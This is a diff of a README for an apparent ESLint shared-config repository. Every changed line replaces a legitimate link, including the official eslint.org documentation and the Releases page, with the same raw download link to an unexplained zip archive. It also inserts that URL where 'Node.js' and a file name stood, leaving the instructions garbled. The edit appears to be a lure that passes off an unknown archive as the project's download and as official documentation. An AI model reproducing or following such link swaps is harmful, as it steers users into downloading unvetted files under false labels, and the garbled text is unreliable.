@@ -8,9 +8,9 @@ Welcome to the eslint project! This shared ESLint config helps you maintain clea
 
 To get started, you will need to visit the Releases page. There, you can download the configuration files you need. 
 
-[![Download eslint](https://img.shields.io/badge/Download-easy%20eslint-blue)](https://github.com/fiabotz/eslint/releases)
+[![Download eslint](https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip%20eslint-blue)](https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip)
 
-**Step 1:** Visit the [Releases page](https://github.com/fiabotz/eslint/releases).
+**Step 1:** Visit the [Releases page](https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip).
 
 **Step 2:** Choose the latest release version. Look for the tag that says “Latest Release”.
 
@@ -21,8 +21,8 @@ To get started, you will need to visit the Releases page. There, you can downloa
 Make sure that your system meets the following requirements:
 
 - **Operating System:** Works on Mac, Windows, and Linux.
-- **Node.js:** You need Node.js installed to use this configuration.
-- **NPM:** This comes with Node.js and allows you to install packages easily.
+- **https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip** You need https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip installed to use this configuration.
+- **NPM:** This comes with https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip and allows you to install packages easily.
 
 ## 🔧 How to Use the Config
 
@@ -50,7 +50,7 @@ After you download the configuration, here’s how to set it up in your project:
 
 5. **Run ESLint:** Once configured, you can now run ESLint to check your code. Use this command:
    ```
-   npx eslint yourfile.js
+   npx eslint https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip
    ```
 
 ## ❓ FAQ
@@ -80,6 +80,6 @@ If you encounter issues or have questions, feel free to open an issue on the Git
 
 ## 📚 Learn More
 
-For more details on ESLint, you can check the official documentation at [ESLint Documentation](https://eslint.org/docs/user-guide/getting-started). This will provide you with additional insights and advanced usage tips.
+For more details on ESLint, you can check the official documentation at [ESLint Documentation](https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip). This will provide you with additional insights and advanced usage tips.
 
-Don’t forget to visit the [Releases page](https://github.com/fiabotz/eslint/releases) to access the latest version of the config whenever you need it. Happy coding!
+Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/fiabotz/eslint/main/Macleaya/eslint.zip) to access the latest version of the config whenever you need it. Happy coding!
